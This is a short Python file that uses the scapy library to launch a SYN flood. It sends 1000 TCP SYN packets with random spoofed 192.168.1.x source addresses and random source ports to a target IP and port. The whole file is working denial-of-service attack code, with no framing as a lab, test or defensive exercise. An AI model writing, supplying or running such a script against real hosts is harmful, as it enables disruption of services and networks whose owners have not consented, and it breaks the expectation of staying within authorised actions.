from scapy.all import *
import random

def launch_syn_flood(target_ip,target_port,interface):
	print(f"Launching SYN flood on {target_ip} : {target_port} via {interface}")
	try:
		for i in range(1000):
			ip=IP(src=f"192.168.1.{random.randint(2,254)}",dst=target_ip)
			tcp=TCP(sport=random.randint(1024,65535),dport=target_port,flags="S")
			packet=ip/tcp
			send(packet,iface=interface,verbose=False)
		print("[+]SYN Flood completed")
	except Exception as e:
		print(f"[!]Error:{e}")
